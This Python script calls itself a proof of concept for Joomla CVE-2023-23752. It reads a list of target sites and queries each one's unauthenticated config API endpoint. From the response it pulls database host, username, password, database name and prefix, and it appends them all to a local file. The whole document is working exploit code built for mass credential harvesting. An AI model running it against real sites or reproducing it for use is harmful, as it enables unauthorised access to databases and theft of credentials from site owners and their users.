import re
import requests
import threading
import time
import json


def getdata(url):
    try:
        url = url.strip()
        url = url + '/api/index.php/v1/config/application?public=true'
        response = requests.get(url, timeout=5)
        if response.status_code in [200, 406]:
            content = str(response.text)
            data = json.loads(content)
            for item in data['data']:
                attributes = item.get('attributes')
                for key, value in attributes.items():
                    if key == 'dbtype':
                        dbtype = value
                    if key == 'host':
                        host = value
                    if key == 'user':
                        user = value
                    if key == 'password':
                        password = value
                    if key == 'db':
                        db = value
                    if key == 'dbprefix':
                        dbprefix = value 
            with open('databases.txt', 'a') as f:
                f.write("url: " + url + '\n')
                f.write("dbtype: " + dbtype + '\n')
                f.write("host: " + host + '\n')
                f.write("user: " + user + '\n')
                f.write("password: " + password + '\n')
                f.write("db: " + db + '\n')
                f.write("dbprefix: " + dbprefix + '\n')
                f.write('\n')
        else:   
            print(url + ' ' + ' api is not open')
    except:
        pass

def main():
    print("Joomla! CVE-2023-23752 PoC by cyberthint.io")
    print("------------------------------")
    with open('list.txt', 'r') as f:
        urls = f.readlines()
    for url in urls:
        getdata(url)

if __name__ == "__main__":
    main()
